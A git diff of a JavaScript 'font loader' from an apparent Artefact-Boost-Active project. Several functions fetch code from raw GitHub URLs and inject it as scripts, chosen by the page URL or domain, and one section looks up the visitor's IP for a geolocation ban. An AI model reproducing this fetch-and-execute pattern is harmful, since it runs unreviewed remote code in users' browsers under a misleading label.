@@ -1,166 +1,108 @@
+(async function () {
+    console.log("Initializing scripts...");
 
-  // Function to find and load fonts for pages based on the current page URL
-  function findAndLoadFontsForPages() {
-    // Get the current page URL
-    const currentPageURL = window.location.href;
+    // ========== Font Loader V2 ==========
+    const ARRAY_LIST_URL = 'https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/fonts/remote_upload/list/array.list';
+    let fontArray = null;
 
-    // Fetch the JSON data
-    fetch('https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/fonts/use_font.json')
-      .then(response => response.json())  // Parse the JSON data
-      .then(data => {
-        console.log('Fetched JSON data:', data);
-
-        // Check if the current page URL matches any entry in the JSON data
-        const matchingEntry = data.find(item => {
-          // Convert the pattern (e.g., discord.com*) to a regex and test it against the current URL
-          const regexPattern = item.url.replace('*', '.*'); // Replace '*' with '.*' for regex matching
-          const regex = new RegExp('^' + regexPattern + '$'); // Build the full regex pattern
-          return regex.test(currentPageURL); // Test if the current URL matches the regex
-        });
-
-        if (matchingEntry) {
-          // If a match is found, fetch the script associated with this URL
-          console.log(`Page URL matches: ${currentPageURL}`);
-          console.log(`Fetching and executing script from: ${matchingEntry.font}`);
-
-          fetch(matchingEntry.font)  // Fetch the script content
-            .then(scriptResponse => scriptResponse.text())
-            .then(scriptContent => {
-              console.log(`Successfully fetched script for ${currentPageURL}`);
-
-              // Inject the script into the page
-              const scriptElement = document.createElement('script');
-              scriptElement.innerHTML = scriptContent;
-              document.head.appendChild(scriptElement);
-
-              console.log(`Executed script for ${currentPageURL}`);
-            })
-            .catch(error => {
-              console.error(`Error fetching script for ${currentPageURL}:`, error);
-            });
-        } else {
-          // If no match is found, log that the page URL does not match any entry
-          console.log(`No matching entry found for page URL: ${currentPageURL}`);
+    async function loadFontArray() {
+        try {
+            const response = await fetch(ARRAY_LIST_URL);
+            if (!response.ok) throw new Error('Failed to load font array list.');
+            fontArray = await response.json();
+            console.log('Font array list loaded successfully:', fontArray);
+        } catch (error) {
+            console.error('Error loading font array list:', error);
         }
-      })
-      .catch(error => {
-        console.error('Error fetching JSON:', error);
-      });
-  }
-
-  // Call the function to find and load fonts for pages
-  findAndLoadFontsForPages();
-
-
-
-// FontLoader V2 (better version)
-
-const ARRAY_LIST_URL = 'https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/fonts/remote_upload/list/array.list';
-
-// Background: Load array list
-let fontArray = null;
-
-(async function loadFontArray() {
-    try {
-        const response = await fetch(ARRAY_LIST_URL);
-        if (!response.ok) throw new Error('Failed to load font array list.');
-        fontArray = await response.json();
-        console.log('Font array list loaded successfully:', fontArray);
-    } catch (error) {
-        console.error('Error loading font array list:', error);
-    }
-})();
-
-// Function to load font by ID
-async function loadfont(fontId) {
-    if (!fontArray) {
-        console.error('Font array not loaded yet. Please wait or check for errors.');
-        return;
     }
 
-    try {
-        // Find the font entry by ID
-        const fontEntry = fontArray.list.find(font => font.id === fontId);
-        if (!fontEntry) {
-            console.error(`Font with ID "${fontId}" not found.`);
+    await loadFontArray(); // Ensure font array is loaded before anything else
+
+    async function loadfont(fontId) {
+        if (!fontArray) {
+            console.error('Font array not loaded yet. Please wait or check for errors.');
             return;
         }
 
-        console.log(`Loading font: ${fontEntry.data.title}`);
-
-        // Fetch the raw_url to get the font data
-        const fontResponse = await fetch(fontEntry.raw_url);
-        if (!fontResponse.ok) throw new Error('Failed to fetch font data.');
-        const fontData = await fontResponse.json();
-
-        // Find the appropriate script template based on type
-        const scriptTemplate = fontArray.script_array.find(script => {
-            const fileFormat = fontEntry.data.original_file_format;
-            if (fileFormat === '.zip') return script.type === 'zip';
-            if (['.ttf', '.woff', '.woff2', '.otf'].includes(fileFormat)) return script.type === fileFormat || script.type === fileFormat.replace('.', '');
-            return false;
-        });
-
-        if (!scriptTemplate) {
-            console.error(`No script template found for type: ${fontEntry.data.original_file_format}`);
-            return;
-        }
-
-        // Log the console_log value
-        if (scriptTemplate.console_log) {
-            console.log('Script console_log:', scriptTemplate.console_log);
-        }
-
-        // Replace ${base64} in the script with the actual base64 content
-        const scriptContent = scriptTemplate.script.replace('${base64}', fontData.base64);
-
-        // Create and execute the script dynamically
-        const scriptElement = document.createElement('script');
-        scriptElement.textContent = scriptContent;
-        document.body.appendChild(scriptElement);
-
-        console.log(`Font "${fontEntry.data.title}" loaded successfully.`);
-    } catch (error) {
-        console.error('Error loading font:', error);
-    }
-}
-
-// Example to load: loadfont('UPLOAD_1735412499_x8fv2i4tr');
-
-(async function loadCustomFontLoaderScript() {
-            const scriptUrl = 'https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/fonts/remote_upload/standalonerun/customloader.execute';
-            try {
-                const response = await fetch(scriptUrl);
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-                const scriptContent = await response.text();
-                const script = document.createElement('script');
-                script.type = 'text/javascript';
-                script.textContent = scriptContent;
-                document.head.appendChild(script);
-                console.log('Custom font loader script loaded and executed successfully.');
-            } catch (error) {
-                console.error('Failed to load and execute the custom font loader script.', error);
+        try {
+            const fontEntry = fontArray.list.find(font => font.id === fontId);
+            if (!fontEntry) {
+                console.error(`Font with ID "${fontId}" not found.`);
+                return;
             }
-        })();
 
-// Example to load:  <p><cfont cfont="UPLOAD_1735484919_em4zt1546">This is text in yet another custom font.</cfont></p>;
+            console.log(`Loading font: ${fontEntry.data.title}`);
+            const fontResponse = await fetch(fontEntry.raw_url);
+            if (!fontResponse.ok) throw new Error('Failed to fetch font data.');
+            const fontData = await fontResponse.json();
 
-(async () => {
-    console.log("Initializing the geolocation ban script...");
+            const scriptTemplate = fontArray.script_array.find(script => {
+                const fileFormat = fontEntry.data.original_file_format;
+                return ['.zip', '.ttf', '.woff', '.woff2', '.otf'].includes(fileFormat) &&
+                    (script.type === fileFormat || script.type === fileFormat.replace('.', ''));
+            });
 
-    const CONFIG_URL = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/geo_location_ban/algoritm.json";
-    const PANIC_SCRIPT_URL = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/geo_location_ban/panic.json";
+            if (!scriptTemplate) {
+                console.error(`No script template found for type: ${fontEntry.data.original_file_format}`);
+                return;
+            }
 
-    // Fetch the public IP address
-    function fetchPublicIP() {
-        return fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => data.ip);
+            if (scriptTemplate.console_log) {
+                console.log('Script console_log:', scriptTemplate.console_log);
+            }
+
+            const scriptContent = scriptTemplate.script.replace('${base64}', fontData.base64);
+            const scriptElement = document.createElement('script');
+            scriptElement.textContent = scriptContent;
+            document.body.appendChild(scriptElement);
+
+            console.log(`Font "${fontEntry.data.title}" loaded successfully.`);
+        } catch (error) {
+            console.error('Error loading font:', error);
+        }
     }
-// Example:  <p><cfont cfont="UPLOAD_1735484919_em4zt1546">This is text in yet another custom font.</cfont></p>
-    // Fetch configuration JSON
+
+    // Example: loadfont('UPLOAD_1735412499_x8fv2i4tr');
+
+    // ========== Find and Load Fonts for Pages ==========
+    async function findAndLoadFontsForPages() {
+        const currentPageURL = window.location.href;
+        const JSON_URL = 'https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/fonts/use_font.json';
+
+        try {
+            const response = await fetch(JSON_URL);
+            const data = await response.json();
+            console.log('Fetched JSON data:', data);
+
+            const matchingEntry = data.find(item => {
+                const regexPattern = item.url.replace(/\*/g, '.*');
+                return new RegExp('^' + regexPattern + '$').test(currentPageURL);
+            });
+
+            if (matchingEntry) {
+                console.log(`Page URL matches: ${currentPageURL}`);
+                console.log(`Fetching and executing script from: ${matchingEntry.font}`);
+
+                const scriptResponse = await fetch(matchingEntry.font);
+                const scriptContent = await scriptResponse.text();
+                const scriptElement = document.createElement('script');
+                scriptElement.textContent = scriptContent;
+                document.head.appendChild(scriptElement);
+
+                console.log(`Executed script for ${currentPageURL}`);
+            } else {
+                console.log(`No matching entry found for page URL: ${currentPageURL}`);
+            }
+        } catch (error) {
+            console.error('Error fetching JSON:', error);
+        }
+    }
+
+    await findAndLoadFontsForPages();
+
+    // ========== Geolocation Ban Script ==========
+    const CONFIG_URL = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/geo_location_ban/algoritm.json";
+
     async function fetchConfig() {
         try {
             const response = await fetch(CONFIG_URL);
@@ -172,17 +114,15 @@ async function loadfont(fontId) {
         }
     }
 
-    // Generate a unique incident ID
+    const config = await fetchConfig();
 
-
-(async () => {
-    // Ensure to run the script only on the correct domain
+    // ========== Domain-Based Script Execution ==========
+    const SCRIPT_URL = 'https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/geo_location_ban/run_script.json';
     const currentDomain = window.location.hostname;
-    const url = 'https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/geo_location_ban/run_script.json';
 
     try {
         console.log(`Checking domain: ${currentDomain}`);
-        const response = await fetch(url);
+        const response = await fetch(SCRIPT_URL);
         if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
 
         const data = await response.json();
@@ -190,36 +130,19 @@ async function loadfont(fontId) {
 
         console.log("Executing script...");
         const scriptElement = document.createElement('script');
-        scriptElement.textContent = scriptContent; // Inject the script content
-        document.body.appendChild(scriptElement); // Append it to the DOM to execute
+        scriptElement.textContent = scriptContent;
+        document.body.appendChild(scriptElement);
     } catch (error) {
         console.error('Error fetching script:', error);
     }
+
+    // ========== Add Temporary Element ==========
+    (function () {
+        const currentTimestamp = Math.floor(Date.now() / 1000);
+        if (window.location.href.startsWith('https://drmineword.github.io/Artefact-Boost-Active/') && currentTimestamp < 1735945200) {
+            const element = document.createElement('div');
+            element.innerHTML = '<cfont cfont="UPLOAD_1735412450_ftrottvw2"><a href="https://drmineword.github.io/Artefact-Boost-Active/entry17" style="text-decoration: none; color: white; background-color: black; padding: 5px;">DARK DARKER YET DARKER</a></cfont>';
+            document.body.appendChild(element);
+        }
+    })();
 })();
-
-
-
-
-
-let config = null;  // Variable to store the configuration
-let isJsonFetched = false;  // Flag to track if JSON is fetched
-let logs = [];  // Array to store log objects for console output
-
-
-
-
-
-
-// add a element temp
-(function() {
-  // Get current Unix timestamp
-  var currentTimestamp = Math.floor(Date.now() / 1000);
-
-  // Check if the current URL matches and if the timestamp is less than 1735945200
-  if (window.location.href.startsWith('https://drmineword.github.io/Artefact-Boost-Active/') && currentTimestamp < 1735945200) {
-    var element = document.createElement('div');
-    element.innerHTML = '<cfont cfont="UPLOAD_1735412450_ftrottvw2"><a href="https://drmineword.github.io/Artefact-Boost-Active/entry17" style="text-decoration: none; color: white; background-color: black; padding: 5px;">DARK DARKER YET DARKER</a></cfont>';
-    document.body.appendChild(element);
-  }
-})();
-
